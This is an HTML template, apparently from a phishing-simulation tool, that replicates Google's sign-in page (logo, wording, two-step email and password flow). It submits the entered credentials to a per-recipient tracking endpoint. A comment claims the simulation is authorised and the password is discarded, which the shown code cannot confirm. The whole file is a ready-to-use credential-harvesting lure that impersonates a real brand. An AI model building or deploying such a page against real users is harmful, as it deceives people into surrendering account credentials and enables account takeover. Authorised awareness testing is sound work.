<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sign in - Google Accounts</title>
  <style>
    /* Authorised phishing-simulation recreation. Password is DISCARDED. */
    *{box-sizing:border-box}
    body{margin:0;font-family:Roboto,Arial,-apple-system,Helvetica,sans-serif;color:#202124;background:#fff}
    .bg{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;background:#fff}
    .card{border:1px solid #dadce0;border-radius:8px;width:450px;max-width:100%;padding:48px 40px 36px;text-align:center}
    .g{width:44px;height:44px;margin:0 auto 14px;display:block}
    h1{font-size:24px;font-weight:400;margin:6px 0 6px}
    .sub{font-size:16px;margin-bottom:26px}
    .field{margin:22px 0 6px;text-align:left}
    label{font-size:12px;color:#5f6368}
    input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none;margin-top:4px}
    input:focus{border:2px solid #1a73e8;padding:12px 14px}
    .hint{text-align:left;font-size:14px;color:#5f6368;margin-top:14px;line-height:1.5}
    a{color:#1a73e8;text-decoration:none;font-weight:500}
    a:hover{text-decoration:underline}
    .actions{display:flex;align-items:center;justify-content:space-between;margin-top:36px}
    .btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
    .btn:hover{background:#1b66c9}
    .link-btn{background:none;border:none;color:#1a73e8;font-weight:500;font-size:14px;cursor:pointer;padding:8px}
    .foot{display:flex;justify-content:space-between;color:#5f6368;font-size:12px;margin-top:40px}
    .foot a{color:#5f6368;font-weight:400}
  </style>
</head>
<body>
  <div class="bg">
    <div class="card">
      <svg class="g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <path fill="#4285F4" d="M24 20v8.5h11.9c-.5 2.8-2 5.1-4.4 6.7l7.1 5.5C42.8 36.9 45 31 45 24c0-1.4-.1-2.7-.4-4H24z"/>
        <path fill="#34A853" d="M10.5 28.3l-1.6 1.2-5.6 4.4C6.9 41.3 14.8 47 24 47c6.5 0 11.9-2.1 15.9-5.8l-7.1-5.5c-2 1.3-4.5 2.1-8.8 2.1-6.4 0-11.8-4.3-13.7-10.1z"/>
        <path fill="#FBBC05" d="M3.3 13.7C1.2 17.8 0 22.1 0 26.5s1.2 8.7 3.3 12.8l7.2-5.6C9.9 32.3 9.5 30.4 9.5 26.5s.4-5.8 1-7.2l-7.2-5.6z"/>
        <path fill="#EA4335" d="M24 9.5c3.5 0 6.7 1.2 9.2 3.6l6.3-6.3C35.9 3 30.5 1 24 1 14.8 1 6.9 6.7 3.3 13.7l7.2 5.6C12.2 13.8 17.6 9.5 24 9.5z"/>
      </svg>
      <h1>Sign in</h1>
      <div class="sub">Use your Google Account</div>
      <form method="post" action="{{ url_for('tracking.submit', token=token) }}">
        <input type="text" name="website_url" style="display:none" tabindex="-1" autocomplete="off">
        <div id="s1">
          <div class="field">
            <input type="email" name="username" placeholder="Email or phone" required autofocus>
          </div>
          <div class="hint"><a href="#">Forgot email?</a></div>
          <div class="hint">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
          <div class="actions">
            <button class="link-btn" type="button">Create account</button>
            <button class="btn" type="button" id="next">Next</button>
          </div>
        </div>
        <div id="s2" style="display:none">
          <div class="field">
            <input type="password" name="password" id="pw" placeholder="Enter your password">
          </div>
          <div class="hint"><a href="#">Forgot password?</a></div>
          <div class="actions">
            <span></span>
            <button class="btn" type="submit">Next</button>
          </div>
        </div>
      </form>
      <div class="foot"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
    </div>
  </div>
  <script>
    document.getElementById('next').addEventListener('click',function(){
      var u=document.querySelector('input[name=username]');
      if(!u.value){ if(u.reportValidity) u.reportValidity(); return; }
      document.getElementById('s1').style.display='none';
      document.getElementById('s2').style.display='block';
      var pw=document.getElementById('pw'); pw.setAttribute('required','required'); pw.focus();
    });
  </script>
</body>
</html>
